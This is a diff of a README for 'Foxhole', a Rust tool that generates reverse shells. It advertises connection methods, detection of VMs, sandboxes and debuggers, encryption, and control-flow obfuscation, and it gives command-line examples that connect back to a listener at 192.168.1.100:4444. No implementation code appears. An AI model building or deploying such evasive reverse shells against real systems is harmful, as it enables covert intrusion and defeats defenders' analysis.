@@ -1,95 +1,170 @@
 # Foxhole
 
-A stealthy, cross-platform reverse shell generator written in Rust.
+A stealthy, cross-platform reverse shell generator in Rust.
 
 ## Features
 
-- Cross-platform support (Linux and Windows)
-- TLS encryption support
-- XOR encryption for sensitive data
-- Anti-debugging capabilities
-- Connection retry with exponential backoff
-- Customizable shell path
-- Minimal and fast binaries
-- Release mode compilation for smaller size
+- **Multiple Connection Methods**
+  - TCP
+  - UDP
+  - WebSocket
+  - HTTP (planned)
+  - DNS tunneling (planned)
+  - ICMP tunneling (planned)
+
+- **Advanced Anti-Detection**
+  - VM detection
+  - Sandbox detection
+  - Debugger detection
+  - Analysis tool detection
+  - Timing-based detection
+  - Hardware fingerprinting
+  - Process monitoring
+  - Registry scanning
+  - DLL injection detection
+
+- **Obfuscation Techniques**
+  - XOR encryption
+  - RC4 encryption
+  - AES encryption
+  - Control flow obfuscation
+  - Anti-disassembly techniques
+  - Dynamic key generation
+
+- **Security Features**
+  - TLS support
+  - Proxy support (SOCKS5, HTTP)
+  - Connection retry logic
+  - Timeout handling
+  - Error handling
+  - Cross-platform compatibility
+
+## Requirements
+
+- Rust 1.70 or later
+- OpenSSL development libraries
+- Windows SDK (for Windows builds)
+- Cross-compilation toolchains (for cross-platform builds)
 
 ## Installation
 
+1. Clone the repository:
 ```bash
-git clone https://github.com/ArsCodeAmatoria/foxhole.git
+git clone https://github.com/yourusername/foxhole.git
 cd foxhole
+```
+
+2. Build the project:
+```bash
 cargo build --release
 ```
 
 ## Usage
 
-```bash
-foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] [--anti-debug] --output <output_path>
-```
-
 ### Command Line Arguments
 
-- `--ip`: Target IP address or hostname
-- `--port`: Target port number
-- `--os`: Target operating system (linux or windows)
-- `--shell`: Custom shell path (optional)
-- `--tls`: Enable TLS encryption
-- `--anti-debug`: Enable anti-debugging features
-- `--output`: Output binary path
-
-### Examples
-
-Basic Linux reverse shell:
 ```bash
-foxhole --ip 192.168.1.100 --port 4444 --os linux --output shell
+foxhole [OPTIONS]
+
+Options:
+    -h, --host <HOST>           Server host address
+    -p, --port <PORT>           Server port number
+    -m, --method <METHOD>       Connection method (tcp, udp, websocket, http, dns, icmp)
+    -t, --tls                   Enable TLS encryption
+    -x, --proxy <PROXY>         Proxy configuration (format: type:host:port)
+    -k, --key <KEY>             Encryption key (optional)
+    -r, --retry <COUNT>         Number of connection retries
+    -d, --delay <SECONDS>       Delay between retries
+    -v, --verbose              Enable verbose output
+    --help                     Display this help message
 ```
 
-Windows reverse shell with TLS and anti-debugging:
-```bash
-foxhole --ip example.com --port 443 --os windows --tls --anti-debug --output shell.exe
-```
-
-Custom shell path with all features:
-```bash
-foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --tls --anti-debug --output shell
-```
-
-### Anti-Debugging Features
-
-When enabled, the generated binary includes:
-- Debugger detection for Windows and Linux
-- Process monitoring for common debuggers (GDB, LLDB, IDA, etc.)
-- Sleep detection to detect time manipulation
-- Automatic termination if debugging is detected
-
-### Connection Features
-
-The generated binary includes:
-- Automatic connection retry with exponential backoff
-- Configurable retry parameters
-- TLS support with proper error handling
-- XOR encryption for sensitive data
-
-## Requirements
-
-- Rust toolchain (latest stable)
-- `rustc` compiler
-- For cross-compilation: `cross` (optional)
-
-## Building for Different Platforms
-
-### Linux to Windows Cross-Compilation
+### Example
 
 ```bash
-cross build --release --target x86_64-pc-windows-msvc
+# Basic TCP connection
+foxhole -h 192.168.1.100 -p 4444
+
+# WebSocket connection with TLS
+foxhole -h example.com -p 443 -m websocket -t
+
+# UDP connection with proxy
+foxhole -h 192.168.1.100 -p 4444 -m udp -x socks5:proxy.example.com:1080
 ```
 
-### Windows to Linux Cross-Compilation
+## Anti-Detection Features
 
-```bash
-cross build --release --target x86_64-unknown-linux-gnu
-```
+### VM Detection
+- Checks for VM-specific processes
+- Detects VM-related files and directories
+- Scans for VM registry keys
+- Identifies VM hardware characteristics
+- Monitors VM-specific DLLs
+- Analyzes timing patterns
+- Detects VM keyboard patterns
+- Identifies VM computer names
 
-## Security Note
+### Sandbox Detection
+- Identifies sandbox processes
+- Detects sandbox-specific files
+- Scans for sandbox registry keys
+- Monitors sandbox DLLs
+- Analyzes timing patterns
+- Detects sandbox keyboard patterns
+- Identifies sandbox computer names
 
-This tool is for educational and authorized testing purposes only. Unauthorized use on systems you don't own or have permission to test is illegal. 
+### Debugger Detection
+- Identifies debugger processes
+- Detects debugger DLLs
+- Monitors timing patterns
+- Detects debugger keyboard patterns
+- Identifies debugger computer names
+
+### Analysis Tool Detection
+- Identifies analysis processes
+- Detects analysis-specific files
+- Scans for analysis registry keys
+- Monitors analysis DLLs
+- Analyzes timing patterns
+- Detects analysis keyboard patterns
+- Identifies analysis computer names
+
+## Obfuscation Techniques
+
+### Encryption Methods
+- XOR encryption with dynamic key generation
+- RC4 encryption with variable key length
+- AES encryption with configurable key size
+
+### Code Obfuscation
+- Control flow obfuscation
+- Anti-disassembly techniques
+- Dynamic code generation
+- Junk instruction insertion
+- Conditional jump manipulation
+
+## Security Considerations
+
+- All connections are encrypted by default
+- TLS support for secure communication
+- Proxy support for additional anonymity
+- Connection retry logic for reliability
+- Timeout handling to prevent hanging
+- Comprehensive error handling
+- Cross-platform compatibility
+
+## Contributing
+
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/amazing-feature`)
+3. Commit your changes (`git commit -m 'Add some amazing feature'`)
+4. Push to the branch (`git push origin feature/amazing-feature`)
+5. Open a Pull Request
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## Disclaimer
+
+This tool is for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program. 
